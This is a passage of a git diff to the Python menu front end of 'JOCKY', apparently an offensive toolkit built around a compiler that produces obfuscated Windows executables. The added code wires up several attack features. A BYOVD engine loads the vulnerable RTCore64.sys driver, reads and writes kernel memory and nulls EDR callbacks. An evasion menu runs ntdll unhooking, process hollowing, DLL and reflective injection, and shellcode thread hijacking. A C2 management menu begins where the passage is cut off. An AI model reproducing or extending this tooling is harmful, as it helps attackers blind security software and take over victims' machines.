+                    console.print(Syntax(ir_text[:4000], "llvm", theme="monokai"))
+                else:
+                    print(ir_text[:4000])
+                if len(ir_text) > 4000:
+                    rprint(f"\n  [dim]... {len(ir_text)-4000} chars truncated[/dim]")
+            except Exception as e:
+                cprint(f"  [red]{e}[/red]")
+
+        elif choice == "5":
+            print_section("Full Pipeline Trace")
+            try:
+                from compiler import compile_jocky
+                out = run_and_capture(compile_jocky, str(src_path),
+                                      str(OUTPUT_DIR), emit_ir=True, run_jit=False)
+                show_output(out)
+            except Exception as e:
+                cprint(f"  [red]{e}[/red]")
+
+        pause()
+
+# ── Build ─────────────────────────────────────────────────────────────────────
+
+def menu_build() -> None:
+    while True:
+        choice = menu("Build",
+                      ["Compile .jk to native .exe (full pipeline)",
+                       "JIT run .jk",
+                       "Batch compile all .jk in scripts/",
+                       "Show last build output",
+                       "Open output/ folder"])
+        if choice == "0":
+            return
+
+        if choice == "1":
+            path = get_input("Source .jk file")
+            src = Path(path)
+            if not src.exists():
+                cprint("  [red]File not found[/red]"); pause(); continue
+            obf = get_input("Obfuscate? (y/n)", "y").lower() == "y"
+            clear()
+            try:
+                from compiler import compile_jocky
+                out = run_and_capture(compile_jocky, str(src), str(OUTPUT_DIR),
+                                      obfuscate=obf, run_jit=False)
+                show_output(out)
+            except Exception as e:
+                cprint(f"  [red]{e}[/red]")
+            pause()
+
+        elif choice == "2":
+            path = get_input("Source .jk file")
+            src = Path(path)
+            if not src.exists():
+                cprint("  [red]File not found[/red]"); pause(); continue
+            clear()
+            try:
+                from compiler import compile_jocky
+                out = run_and_capture(compile_jocky, str(src), str(OUTPUT_DIR), run_jit=True)
+                show_output(out)
+            except Exception as e:
+                cprint(f"  [red]{e}[/red]")
+            pause()
+
+        elif choice == "3":
+            clear()
+            print_section("Batch compile")
+            jk_files = list(SCRIPTS_DIR.glob("*.jk"))
+            cprint(f"  Found {len(jk_files)} scripts")
+            try:
+                from compiler import compile_jocky
+                for f in jk_files:
+                    out = run_and_capture(compile_jocky, str(f), str(OUTPUT_DIR), run_jit=False)
+                    status = "[green]OK[/green]" if "Executable" in out or "SHA-256" in out else "[red]FAIL[/red]"
+                    rprint(f"  {status}  {f.name}")
+            except Exception as e:
+                cprint(f"  [red]{e}[/red]")
+            pause()
+
+        elif choice == "4":
+            logs = list(OUTPUT_DIR.glob("*.ll")) + list(OUTPUT_DIR.glob("*.exe"))
+            if not logs:
+                cprint("  [dim]No output files yet[/dim]")
+            else:
+                for f in sorted(logs):
+                    rprint(f"  [cyan]{f.name}[/cyan]  {f.stat().st_size//1024} KB")
+            pause()
+
+        elif choice == "5":
+            if IS_WINDOWS:
+                os.startfile(str(OUTPUT_DIR))
+            else:
+                subprocess.Popen(["xdg-open", str(OUTPUT_DIR)])
+
+# ── BYOVD Engine ──────────────────────────────────────────────────────────────
+
+def menu_byovd() -> None:
+    while True:
+        choice = menu("BYOVD Engine",
+                      ["Scan for vulnerable drivers (LOLDrivers DB, SHA-256 cross-ref)",
+                       "Load RTCore64.sys driver",
+                       "Get kernel base address",
+                       "Enumerate kernel callbacks (process/thread/image)",
+                       "Read kernel memory",
+                       "Write kernel memory",
+                       "Attempt callback blind (EDR suppress)"],
+                      f"Platform: {platform.system()} | DB: loldrivers.json (40+ entries)")
+        if choice == "0":
+            return
+
+        if choice == "1":
+            clear()
+            print_section("BYOVD Vulnerable Driver Scan")
+            try:
+                from byovd.scanner import DriverScanner
+                scanner = DriverScanner()
+                rprint(f"  [cyan]LOLDrivers DB: {scanner.db_entry_count()} entries[/cyan]")
+                rprint(f"  [dim]Using SHA-256 cross-reference + filename fallback[/dim]\n")
+                findings = scanner.scan()
+                if not findings:
+                    cprint("  [green]No vulnerable drivers found on this system[/green]")
+                else:
+                    for f in findings:
+                        e = f['entry']
+                        color = "red" if f['score'] >= 8 else "yellow" if f['score'] >= 6 else "white"
+                        rprint(f"  [{color}][{f['risk']}][/{color}]  {f['name']}")
+                        rprint(f"         CVE  : [cyan]{e.get('CVE','N/A')}[/cyan]")
+                        rprint(f"         Tags : {', '.join(e.get('Tags',[]))}")
+                        rprint(f"         Match: [dim]{f['match']}[/dim]")
+                        rprint(f"         SHA  : [dim]{f['sha256']}[/dim]")
+                        print()
+            except ImportError as e:
+                cprint(f"  [red]Import error: {e}[/red]")
+            pause()
+
+        elif choice in ("2", "3", "4", "5", "6", "7"):
+            _byovd_kernel_action(choice)
+
+def _byovd_kernel_action(choice: str) -> None:
+    clear()
+    try:
+        from byovd.kernel import KernelInterface
+    except ImportError as e:
+        cprint(f"\n  [red]Import error: {e}[/red]")
+        pause()
+        return
+
+    simulate = not IS_WINDOWS
+    if IS_WINDOWS:
+        ans = get_input("Use simulation mode? (y/n)", "n")
+        simulate = ans.lower() == "y"
+
+    ki = KernelInterface(simulate=simulate)
+
+    if choice == "2":
+        print_section("Load Driver")
+        if simulate:
+            cprint("  [yellow][SIM] RTCore64.sys loaded (simulated)[/yellow]")
         else:
             try:
-                idx = int(choice) - 1
-                if 0 <= idx < len(wk_scripts):
-                    p = wk_scripts[idx]
-                    _script_action_menu(
-                        p, p.name, f"Workspace script: {p}",
-                        allow_edit=True,
-                    )
+                from byovd.loader import DriverLoader
+                drv_path = get_input("Driver path", str(APP_DIR / "byovd" / "RTCore64.sys"))
+                dl = DriverLoader(drv_path, simulate=False)
+                ok = dl.load()
+                cprint(f"  {'[green]Loaded[/green]' if ok else '[red]Failed[/red]'}")
+            except Exception as e:
+                cprint(f"  [red]{e}[/red]")
+
+    elif choice == "3":
+        print_section("Kernel Base")
+        base = ki.get_kernel_base()
+        if base:
+            rprint(f"  [bold green]ntoskrnl.exe base: 0x{base:016X}[/bold green]")
+        else:
+            cprint("  [red]Failed to resolve kernel base (HVCI/VBS may be active)[/red]")
+
+    elif choice == "4":
+        print_section("Kernel Callbacks")
+        cbs = ki.enum_process_callbacks()
+        if not cbs:
+            cprint("  [dim]No callbacks found (driver may need loading first)[/dim]")
+        else:
+            for cb in cbs:
+                ms = cb.get('is_microsoft', True)
+                color = "dim" if ms else "red bold"
+                tag   = "[MS]" if ms else "[EDR]"
+                rprint(f"  [{color}]{tag}[/{color}]  0x{cb['address']:016X}  {cb.get('module','?')}")
+
+    elif choice == "5":
+        print_section("Read Kernel Memory")
+        addr_str = get_input("Address (hex, e.g. 0xFFFFF80000000000)")
+        size_str = get_input("Size (bytes)", "8")
+        try:
+            addr = int(addr_str, 16)
+            size = int(size_str)
+            data = ki.read_memory(addr, size)
+            rprint(f"  Data: [cyan]{data.hex() if data else 'none'}[/cyan]")
+        except Exception as e:
+            cprint(f"  [red]{e}[/red]")
+
+    elif choice == "6":
+        print_section("Write Kernel Memory")
+        cprint("  [yellow]WARNING: Kernel writes can crash the system. Continue?[/yellow]")
+        if get_input("Confirm (yes/no)", "no").lower() != "yes":
+            return
+        addr_str = get_input("Address (hex)")
+        val_str  = get_input("Hex bytes (e.g. 9090)")
+        try:
+            addr = int(addr_str, 16)
+            data = bytes.fromhex(val_str)
+            ki.write_memory(addr, data)
+            cprint("  [green]Write dispatched[/green]")
+        except Exception as e:
+            cprint(f"  [red]{e}[/red]")
+
+    elif choice == "7":
+        print_section("Callback Blind")
+        cbs = ki.enum_process_callbacks()
+        edr_cbs = [c for c in cbs if not c.get('is_microsoft', True)]
+        if not edr_cbs:
+            cprint("  [green]No non-Microsoft callbacks found[/green]")
+        else:
+            rprint(f"  [yellow]{len(edr_cbs)} EDR callback(s) detected[/yellow]")
+            for cb in edr_cbs:
+                rprint(f"    0x{cb['address']:016X}  {cb.get('module','?')}")
+            if not simulate:
+                ans = get_input("Attempt to null these callbacks? (yes/no)", "no")
+                if ans.lower() == "yes":
+                    ki.blind_callbacks(edr_cbs)
+                    cprint("  [green]Blind attempted[/green]")
+            else:
+                cprint("  [dim][SIM] Would null these in real mode[/dim]")
+
+    pause()
+
+# ── Evasion Engine ────────────────────────────────────────────────────────────
+
+def menu_evasion() -> None:
+    if not IS_WINDOWS:
+        cprint("\n  [yellow]Evasion Engine is Windows-only (requires kernel APIs)[/yellow]")
+        pause()
+        return
+
+    while True:
+        choice = menu("Evasion Engine",
+                      ["API Unhooking — restore EDR hooks in ntdll.dll",
+                       "Direct Syscalls — dump SSN table (bypass ntdll)",
+                       "Process Hollowing — hollow host process with payload",
+                       "DLL Injection — inject DLL via LoadLibraryW",
+                       "Reflective DLL Injection",
+                       "Thread Hijacking — redirect thread RIP"],
+                      "Windows kernel-level evasion techniques")
+        if choice == "0":
+            return
+
+        if choice == "1":
+            clear()
+            print_section("API Unhooking")
+            try:
+                from evasion.api_unhook import ApiUnhooker
+                dll = get_input("Target DLL", "ntdll.dll")
+                import os as _os
+                dll_path = _os.path.join(_os.environ.get("WINDIR","C:\\Windows"), "System32", dll)
+                u = ApiUnhooker(dll_path)
+                hooks = u.audit()
+                if not hooks:
+                    cprint(f"  [green]{dll} is clean — no hooks detected[/green]")
                 else:
-                    rprint(f"[red]  Enter 1–{len(wk_scripts)}, N, or 0.[/red]")
-                    pause()
-            except ValueError:
-                rprint("[red]  Enter a script number, N to create, or 0 to go back.[/red]")
-                pause()
-
-
-def _new_script():
-    clear()
-    print_header("New Script", "Create a new JOCKY script in workspace/")
-
-    name = ask("Script name (without .jk)")
-    if not name:
-        return
-    if not name.endswith(".jk"):
-        name += ".jk"
-
-    script_path = WORKSPACE_DIR / name
-    if script_path.exists():
-        rprint(f"\n  [yellow]File already exists: {script_path}[/yellow]")
-        ow = ask("Overwrite? (y/n)")
-        if ow.lower() != "y":
-            return
-
-    template = textwrap.dedent(f"""\
-        ## {name} — JOCKY script
-        ## Entry point must be:  func start() -> nothing {{ ... }}
-
-        func start() -> nothing {{
-            report(`Hello from {name}!`)
-        }}
-    """)
-    script_path.write_text(template, encoding="utf-8")
-
-    rprint(f"\n  [green]Created:[/green] {script_path}")
-    rprint(f"  Run it with:  [cyan]jocky run workspace/{name}[/cyan]")
-
-    _open_editor(script_path)
-
-
-def _open_editor(path: Path):
-    rprint(f"\n  [dim]Opening {path.name} in editor...[/dim]")
-    try:
-        if os.name == "nt":
-            os.startfile(str(path))
-        else:
-            editor = os.environ.get("EDITOR", "nano")
-            subprocess.run([editor, str(path)])
-        rprint("  [dim]Editor launched. Save your file, then return here to run it.[/dim]")
-    except Exception:
-        rprint(f"  [yellow]Could not open editor. Open manually:[/yellow]  {path}")
-    pause()
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-# Menu: Script Inspector
-# ─────────────────────────────────────────────────────────────────────────────
-
-def menu_inspect():
-    while True:
-        clear()
-        print_header("Script Inspector", "Tokens · AST · LLVM IR · Obfuscation")
-
-        wk_scripts = sorted(WORKSPACE_DIR.glob("*.jk"))
-        all_scripts = []   # (display_name, Path)
-
-        if RICH:
-            rprint("\n  [bold cyan]Pre-built Scripts[/bold cyan]")
-        else:
-            print("\n  Pre-built Scripts:")
-
-        for s in BUILTIN_SCRIPTS:
-            p = SCRIPTS_DIR / s["file"]
-            all_scripts.append((s["name"], p))
-            _item(len(all_scripts), s["name"], s["category"])
-
-        if wk_scripts:
-            _divider()
-            rprint("  [bold cyan]Workspace Scripts[/bold cyan]") if RICH \
-                else print("  Workspace Scripts:")
-            for p in wk_scripts:
-                all_scripts.append((p.name, p))
-                _item(len(all_scripts), p.name)
-
-        _divider()
-        _item(0, "Back")
-        rprint("  [dim]Enter number to inspect[/dim]") if RICH \
-            else print("  Enter number to inspect:")
-
-        choice = ask("Select script")
-        if choice == "0":
-            return
-        try:
-            idx = int(choice) - 1
-            if 0 <= idx < len(all_scripts):
-                name, path = all_scripts[idx]
-                _full_inspect(path)
-            else:
-                rprint(f"[red]  Enter 1–{len(all_scripts)} or 0.[/red]")
-                pause()
-        except ValueError:
-            rprint("[red]  Enter a number.[/red]")
+                    rprint(f"  [red]{len(hooks)} hook(s) detected[/red]")
+                    for h in hooks:
+                        rprint(f"    [yellow]{h['function']}[/yellow]  @ 0x{h['mem_addr']:016X}")
+                    if get_input("Restore all hooks? (yes/no)", "no").lower() == "yes":
+                        u.unhook(hooks)
+                        cprint("  [green]Hooks restored[/green]")
+            except ImportError as e:
+                cprint(f"  [red]{e}[/red]")
             pause()
-
-
-def _full_inspect(script_path: Path):
-    source = script_path.read_text(encoding="utf-8")
-
-    while True:
-        clear()
-        print_header(f"Inspect: {script_path.name}", "JOCKY Compilation Pipeline")
-
-        _item(1, "Source Code")
-        _item(2, "Tokens          (Lexer output)")
-        _item(3, "AST             (Parser output)")
-        _item(4, "LLVM IR         (unobfuscated)")
-        _item(5, "LLVM IR         (obfuscated — XOR strings)")
-        _item(6, "Pipeline Summary  (all 5 stages)")
-        _divider()
-        _item(0, "Back")
-
-        choice = ask("View")
-
-        if choice == "0":
-            return
-        elif choice == "1":
-            _show_source(script_path)
-        elif choice == "2":
-            _show_tokens(script_path)
-        elif choice == "3":
-            _show_ast(script_path)
-        elif choice == "4":
-            _show_ir(script_path, obfuscate=False)
-        elif choice == "5":
-            _show_ir(script_path, obfuscate=True)
-        elif choice == "6":
-            _show_summary(script_path, source)
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-# Menu: Build Native Binary
-# ─────────────────────────────────────────────────────────────────────────────
-
-def menu_build():
-    while True:
-        clear()
-        print_header("Build Native Binary", "Compile .jk to a standalone Windows .exe")
-
-        wk_scripts = sorted(WORKSPACE_DIR.glob("*.jk"))
-        all_scripts = []
-
-        if RICH:
-            rprint("\n  [bold cyan]Pre-built Scripts[/bold cyan]")
-        else:
-            print("\n  Pre-built Scripts:")
-
-        for s in BUILTIN_SCRIPTS:
-            p = SCRIPTS_DIR / s["file"]
-            all_scripts.append((s["name"], p))
-            _item(len(all_scripts), s["name"], s["category"])
-
-        if wk_scripts:
-            _divider()
-            rprint("  [bold cyan]Workspace Scripts[/bold cyan]") if RICH \
-                else print("  Workspace Scripts:")
-            for p in wk_scripts:
-                all_scripts.append((p.name, p))
-                _item(len(all_scripts), p.name)
-
-        _divider()
-        rprint("  [dim yellow]Requirements: MinGW gcc on PATH  |  run setup.bat once[/dim yellow]")
-        _item(0, "Back")
-
-        choice = ask("Select script to build")
-        if choice == "0":
-            return
-        try:
-            idx = int(choice) - 1
-            if 0 <= idx < len(all_scripts):
-                name, path = all_scripts[idx]
-                _build_mode_menu(path)
-            else:
-                rprint(f"[red]  Enter 1–{len(all_scripts)} or 0.[/red]")
-                pause()
-        except ValueError:
-            rprint("[red]  Enter a number.[/red]")
-            pause()
-
-
-def _build_mode_menu(script_path: Path):
-    """Ask for obfuscation mode then build."""
-    clear()
-    print_header(f"Build: {script_path.name}", "Compile to standalone Windows .exe")
-
-    if RICH:
-        console.print(f"\n  [cyan]File:[/cyan] {script_path}")
-    _divider()
-    rprint("  [bold yellow]Build Mode[/bold yellow]")
-    _item(1, "Obfuscated  (recommended)",
-          "XOR-encrypted strings + polymorphic build-ID + entropy")
-    _item(2, "Debug  (no obfuscation)",
-          "readable IR, fixed SHA-256 — use for development")
-    _divider()
-    _item(0, "Back")
-
-    choice = ask("Build mode")
-    if choice == "1":
-        _build_script(script_path, obfuscate=True)
-    elif choice == "2":
-        _build_script(script_path, obfuscate=False)
-
-
-def _build_script(script_path: Path, obfuscate: bool = True):
-    mode_label = "Obfuscated" if obfuscate else "Debug (no obfuscation)"
-    clear()
-    print_section(f"Building — {script_path.name}  [{mode_label}]")
-    rprint(f"\n  [dim]Output directory: {OUTPUT_DIR}[/dim]")
-
-    cmd = [sys.executable, str(COMPILER_DIR / "compiler.py"),
-           str(script_path), "-o", str(OUTPUT_DIR)]
-    if not obfuscate:
-        cmd.append("--no-obfuscate")
-
-    result = subprocess.run(
-        cmd,
-        capture_output=True, text=True, cwd=str(COMPILER_DIR),
-        env={**os.environ, "PYTHONUTF8": "1", "PYTHONIOENCODING": "utf-8"},
-    )
-    output = result.stdout + result.stderr
-
-    if RICH:
-        console.print()
-        style = "green" if result.returncode == 0 else "red"
-        obf_tag = " [yellow](obfuscated)[/yellow]" if obfuscate else " [dim](debug)[/dim]"
-        console.print(Panel(output.strip() or "(no output)",
-                            border_style=style,
-                            title=f"[{style}]Build Output[/{style}]{obf_tag}"))
-    else:
-        print("\n" + "─" * 62)
-        print(output)
-        print("─" * 62)
-    pause()
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-# Script viewers
-# ─────────────────────────────────────────────────────────────────────────────
-
-def _show_source(script_path: Path):
-    clear()
-    print_section(f"Source — {script_path.name}")
-    source = script_path.read_text(encoding="utf-8")
-    if RICH:
-        console.print(Panel(
-            Syntax(source, "text", theme="monokai", line_numbers=True, word_wrap=True),
-            border_style="blue", title=f"[cyan]{script_path.name}[/cyan]"
-        ))
-    else:
-        for i, line in enumerate(source.splitlines(), 1):
-            print(f"{i:4}  {line}")
-    pause()
-
-
-def _show_tokens(script_path: Path):
-    clear()
-    print_section(f"Tokens — {script_path.name}")
-    source = script_path.read_text(encoding="utf-8")
-    tokens, err = get_tokens(source)
-
-    if err:
-        rprint(f"[red]Error: {err}[/red]")
-        pause()
-        return
-
-    if RICH:
-        table = Table(box=box.SIMPLE, border_style="blue", header_style="bold cyan")
-        table.add_column("Line",  style="yellow", width=5)
-        table.add_column("Col",   style="dim",    width=4)
-        table.add_column("Type",  style="cyan",   min_width=16)
-        table.add_column("Value", style="white")
-        for tok in tokens:
-            if tok.type.name == "EOF":
-                continue
-            color = "red" if tok.type.name == "ERROR" else "white"
-            table.add_row(str(tok.line), str(tok.column), tok.type.name,
-                          f"[{color}]{tok.value!r}[/{color}]")
-        console.print(table)
-        console.print(f"\n  [dim]Total: {len(tokens)} tokens[/dim]")
-    else:
-        print(f"{'LINE':>4}  {'COL':>3}  {'TYPE':<18}  VALUE")
-        print("─" * 62)
-        for tok in tokens:
-            if tok.type.name == "EOF":
-                continue
-            print(f"{tok.line:>4}  {tok.column:>3}  {tok.type.name:<18}  {tok.value!r}")
-        print(f"\nTotal: {len(tokens)} tokens")
-    pause()
-
-
-def _show_ast(script_path: Path):
-    clear()
-    print_section(f"AST — {script_path.name}")
-    source = script_path.read_text(encoding="utf-8")
-    ast, err = get_ast(source)
-
-    if err:
-        rprint(f"[red]Error: {err}[/red]")
-        pause()
-        return
-
-    lines = ast_to_lines(ast)
-    if RICH:
-        console.print(Panel("\n".join(lines), border_style="green",
-                            title="[green]Abstract Syntax Tree[/green]"))
-        console.print(f"\n  [dim]Functions: {len(ast.functions)}[/dim]")
-        for fn in ast.functions:
-            p = ", ".join(f"{p.name}:{p.type_annotation}" for p in fn.params)
-            console.print(f"    [cyan]func {fn.name}[/cyan]({p}) -> {fn.return_type}")
-    else:
-        for line in lines:
-            print(line)
-    pause()
-
-
-def _show_ir(script_path: Path, obfuscate: bool):
-    label = "Obfuscated" if obfuscate else "Clean"
-    clear()
-    print_section(f"LLVM IR ({label}) — {script_path.name}")
-    source = script_path.read_text(encoding="utf-8")
-    ir_text, err = get_ir(source, obfuscate=obfuscate)
-
-    if err:
-        rprint(f"[red]Error: {err}[/red]")
-        pause()
-        return
-
-    if RICH:
-        console.print(Panel(
-            Syntax(ir_text, "llvm", theme="monokai", line_numbers=True, word_wrap=False),
-            border_style="magenta",
-            title=f"[magenta]LLVM IR — {label}[/magenta]"
-        ))
-        console.print(f"\n  [dim]{ir_text.count(chr(10))} lines  |  {len(ir_text)} chars[/dim]")
-        if obfuscate:
-            console.print("  [yellow]String globals XOR-encrypted."
-                          " SHA-256 changes on every compile.[/yellow]")
-    else:
-        print(ir_text[:5000])
-        if len(ir_text) > 5000:
-            print(f"\n... ({len(ir_text) - 5000} more chars)")
-    pause()
-
-
-def _show_summary(script_path: Path, source: str):
-    clear()
-    print_header(f"Pipeline Summary — {script_path.name}",
-                 "All 5 compilation stages")
-
-    tokens, _ = get_tokens(source)
-    ast,    _  = get_ast(source)
-    ir_cl,  _  = get_ir(source, obfuscate=False)
-    ir_ob,  _  = get_ir(source, obfuscate=True)
-
-    if RICH:
-        table = Table(box=box.ROUNDED, border_style="cyan", show_header=True,
-                      header_style="bold cyan", expand=True)
-        table.add_column("Stage",   style="bold white", min_width=24)
-        table.add_column("Status",  style="bold",       width=8)
-        table.add_column("Details", style="dim white")
-
-        def _row(stage, ok, detail):
-            status = "[green]PASS[/green]" if ok else "[red]FAIL[/red]"
-            table.add_row(stage, status, detail)
-
-        _row("1. Lexer  (tokenise)",
-             tokens is not None,
-             f"{len(tokens)} tokens" if tokens else "—")
-        _row("2. Parser  (AST)",
-             ast is not None,
-             f"{len(ast.functions)} function(s)" if ast else "—")
-        _row("3. Semantic Analysis",
-             ir_cl is not None,
-             "type-checked" if ir_cl else "—")
-        _row("4. LLVM IR Generation",
-             ir_cl is not None,
-             f"{ir_cl.count(chr(10))} IR lines" if ir_cl else "—")
-        _row("5. Obfuscation Pass",
-             ir_ob is not None,
-             f"{ir_ob.count(chr(10))} IR lines  |  XOR + polymorphic ID" if ir_ob else "—")
-        console.print(table)
-
-        if ast:
-            console.print("\n  [bold cyan]Functions:[/bold cyan]")
-            for fn in ast.functions:
-                p = ", ".join(f"{p.name}:{p.type_annotation}" for p in fn.params)
-                console.print(f"    [cyan]func {fn.name}[/cyan]({p}) -> {fn.return_type}")
-    else:
-        rows = [
-            ("1. Lexer",          tokens, f"{len(tokens) if tokens else 0} tokens"),
-            ("2. Parser (AST)",   ast,    f"{len(ast.functions) if ast else 0} func(s)"),
-            ("3. Semantic",       ir_cl,  "ok"),
-            ("4. LLVM IR",        ir_cl,  f"{ir_cl.count(chr(10)) if ir_cl else 0} lines"),
-            ("5. Obfuscation",    ir_ob,  "XOR encrypted"),
-        ]
-        for stage, ok, detail in rows:
-            print(f"  {stage:<24}  {'PASS' if ok else 'FAIL':<6}  {detail}")
-    pause()
-
-
-def _run_script(script_path: Path, obfuscate: bool = False):
-    clear()
-    mode_label = "JIT + Obfuscation  (structural)" if obfuscate else "JIT  (clean)"
-    print_section(f"Running — {script_path.name}  [{mode_label}]")
-
-    if obfuscate:
-        rprint("\n  [dim]Applying structural obfuscation: build-ID + entropy injected.[/dim]")
-        rprint("  [dim]Note: string XOR requires native build (--no-obfuscate is JIT-only limitation).[/dim]")
-
-    rprint("\n  [dim]Compiling and executing via LLVM JIT...[/dim]")
-
-    output, rc = run_jit(str(script_path), obfuscate=obfuscate)
-
-    if RICH:
-        console.print()
-        style = "green" if rc == 0 else "red"
-        obf_tag = " [yellow](obfuscated build)[/yellow]" if obfuscate else ""
-        title = f"[{style}]Output[/{style}]{obf_tag}"
-        console.print(Panel(output.strip() or "(no output)",
-                            border_style=style, title=title))
-        if rc == 0:
-            if obfuscate:
-                console.print("  [green]Execution complete.[/green]  "
-                              "[yellow]Polymorphic build-ID injected — IR hash differs from clean run.[/yellow]")
-            else:
-                console.print("  [green]Execution complete.[/green]")
-        else:
-            console.print(f"  [red]Exit code: {rc}[/red]")
-    else:
-        print("\n" + "─" * 62)
-        print(output)
-        print("─" * 62)
-        print(f"Exit code: {rc}")
-        if obfuscate:
-            print("  (obfuscated run — polymorphic build-ID injected)")
-    pause()
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-# Menu: BYOVD Engine
-# ─────────────────────────────────────────────────────────────────────────────
-
-def _import_byovd():
-    """Lazy-import the BYOVD package; returns (BYOVDScanner, DriverLoader, KernelOps) or None."""
-    try:
-        byovd_dir = APP_DIR
-        if str(byovd_dir) not in sys.path:
-            sys.path.insert(0, str(byovd_dir))
-        from byovd.scanner import BYOVDScanner
-        from byovd.loader  import DriverLoader
-        from byovd.kernel  import KernelOps
-        return BYOVDScanner, DriverLoader, KernelOps
-    except ImportError as e:
-        return None
-
-
-def _run_script_kernel(script_path: Path):
-    """JIT-execute a .jk file with BYOVD kernel mode enabled."""
-    clear()
-    print_section(f"Running — {script_path.name}  [KERNEL MODE]")
-    rprint("\n  [yellow]BYOVD Kernel Mode active — kernel_* stdlib functions enabled.[/yellow]")
-    rprint("  [dim]Simulation mode on host. Real kernel ops require Admin + VM.[/dim]\n")
-
-    cmd = [sys.executable, str(COMPILER_DIR / "compiler.py"),
-           str(script_path), "--run"]
-    env = {**os.environ,
-           "PYTHONUTF8": "1",
-           "PYTHONIOENCODING": "utf-8",
-           "JOCKY_KERNEL_MODE": "1",
-           "PYTHONPATH": str(APP_DIR) + os.pathsep + os.environ.get("PYTHONPATH", "")}
-    result = subprocess.run(cmd, capture_output=True, text=True,
-                            cwd=str(COMPILER_DIR), env=env)
-    output = result.stdout + result.stderr
-
-    if RICH:
-        console.print()
-        style = "green" if result.returncode == 0 else "red"
-        console.print(Panel(output.strip() or "(no output)",
-                            border_style=style,
-                            title=f"[{style}]Kernel Mode Output[/{style}] "
-                                  f"[yellow](BYOVD)[/yellow]"))
-    else:
-        print("\n" + "─" * 62)
-        print(output)
-        print("─" * 62)
-    pause()
-
-
-def menu_byovd():
-    """BYOVD Engine main menu."""
-    mods = _import_byovd()
-
-    while True:
-        clear()
-        print_header("BYOVD Engine",
-                     "Bring Your Own Vulnerable Driver — Kernel-Level Operations")
-
-        if mods is None:
-            rprint("\n  [red]BYOVD module not found.[/red]")
-            rprint("  [dim]Ensure the byovd/ directory is present in the JOCKY Application folder.[/dim]")
-            pause()
-            return
-
-        BYOVDScanner, DriverLoader, KernelOps = mods
-        is_admin = DriverLoader.check_privileges()
-
-        if RICH:
-            admin_str = "[green]Administrator[/green]" if is_admin \
-                        else "[yellow]User (simulation mode)[/yellow]"
-            console.print(f"\n  [cyan]Privilege level:[/cyan] {admin_str}")
-            console.print("  [dim]Full kernel ops require Admin + Windows — simulation active on host.[/dim]")
-
-        _divider()
-        rprint("  [bold yellow]BYOVD Operations[/bold yellow]")
-        _item(1, "Scan System for Vulnerable Drivers",
-              "enumerate drivers + check LOLDrivers DB")
-        _item(2, "View LOLDrivers Database",
-              "browse 25+ known-vulnerable driver entries")
-        _item(3, "Kernel Operations Demo",
-              "base resolution + callback enumeration + memory r/w")
-        _item(4, "EDR Blind Demo",
-              "enumerate + patch non-Microsoft callbacks")
-        _item(5, "Run BYOVD Scanner Script",
-              "execute byovd_scanner.jk in kernel mode")
-        _item(6, "Run Kernel Recon Script",
-              "execute kernel_recon.jk in kernel mode")
-        _item(7, "Load Vulnerable Driver",
-              "service create/start + device open (Admin required)")
-        _divider()
-        _item(0, "Back")
-
-        choice = ask("Choice")
-
-        if choice == "0":
-            return
-
-        elif choice == "1":
-            _byovd_scan_display(BYOVDScanner)
 
         elif choice == "2":
-            _byovd_db_display()
-
-        elif choice == "3":
-            _byovd_kernel_demo(DriverLoader, KernelOps)
-
-        elif choice == "4":
-            _byovd_blind_edr(DriverLoader, KernelOps)
-
-        elif choice == "5":
-            script = SCRIPTS_DIR / "byovd_scanner.jk"
-            if script.exists():
-                _run_script_kernel(script)
-            else:
-                rprint("[red]  byovd_scanner.jk not found in scripts/[/red]")
-                pause()
-
-        elif choice == "6":
-            script = SCRIPTS_DIR / "kernel_recon.jk"
-            if script.exists():
-                _run_script_kernel(script)
-            else:
-                rprint("[red]  kernel_recon.jk not found in scripts/[/red]")
-                pause()
-
-        elif choice == "7":
-            _byovd_load_driver(DriverLoader, KernelOps)
-
-        else:
-            rprint("[red]  Invalid choice.[/red]")
+            clear()
+            print_section("Direct Syscall SSN Table")
+            try:
+                from evasion.syscall import DirectSyscall
+                sc = DirectSyscall()
+                table = sc.dump_ssns()
+                rprint(f"  [cyan]{len(table)} Nt/Zw syscalls found[/cyan]\n")
+                for name, ssn in sorted(table.items(), key=lambda x: x[1])[:40]:
+                    rprint(f"  [dim]SSN 0x{ssn:04X}[/dim]  [white]{name}[/white]")
+                if len(table) > 40:
+                    rprint(f"  [dim]... {len(table)-40} more[/dim]")
+            except ImportError as e:
+                cprint(f"  [red]{e}[/red]")
             pause()
 
+        elif choice == "3":
+            clear()
+            print_section("Process Hollowing")
+            host    = get_input("Host exe (victim)", r"C:\Windows\System32\notepad.exe")
+            payload = get_input("Payload exe (PE to inject)")
+            if not Path(payload).exists():
+                cprint("  [red]Payload not found[/red]")
+            else:
+                try:
+                    from evasion.hollow import hollow
+                    pid = hollow(host, payload)
+                    rprint(f"  [green]Hollowed PID: {pid}[/green]")
+                except Exception as e:
+                    cprint(f"  [red]{e}[/red]")
+            pause()
 
-def _byovd_scan_display(BYOVDScanner):
-    """Run and display a full BYOVD driver scan."""
+        elif choice == "4":
+            clear()
+            print_section("DLL Injection (LoadLibraryW)")
+            pid = get_input("Target PID")
+            dll = get_input("DLL path")
+            try:
+                from evasion.inject import loadlibrary_inject
+                hthread = loadlibrary_inject(int(pid), dll)
+                rprint(f"  [green]Thread: 0x{hthread:X}[/green]")
+            except Exception as e:
+                cprint(f"  [red]{e}[/red]")
+            pause()
+
+        elif choice == "5":
+            clear()
+            print_section("Reflective DLL Injection")
+            pid = get_input("Target PID")
+            dll = get_input("Reflective DLL path")
+            try:
+                from evasion.inject import reflective_inject
+                hthread = reflective_inject(int(pid), dll)
+                rprint(f"  [green]Thread: 0x{hthread:X}[/green]")
+            except Exception as e:
+                cprint(f"  [red]{e}[/red]")
+            pause()
+
+        elif choice == "6":
+            clear()
+            print_section("Thread Hijacking")
+            pid      = get_input("Target PID")
+            sc_hex   = get_input("Shellcode (hex bytes, e.g. 9090C3)")
+            try:
+                from evasion.thread_hijack import hijack_thread
+                sc = bytes.fromhex(sc_hex)
+                result = hijack_thread(int(pid), sc)
+                rprint(f"  [green]TID {result['tid']}: RIP {result['original_rip']:016X} -> {result['new_rip']:016X}[/green]")
+            except Exception as e:
+                cprint(f"  [red]{e}[/red]")
+            pause()
+
+# ── C2 Management ─────────────────────────────────────────────────────────────
+
+def menu_c2() -> None:
+    while True:
+        choice = menu("C2 Management",
+                      ["Start C2 Server (local)",
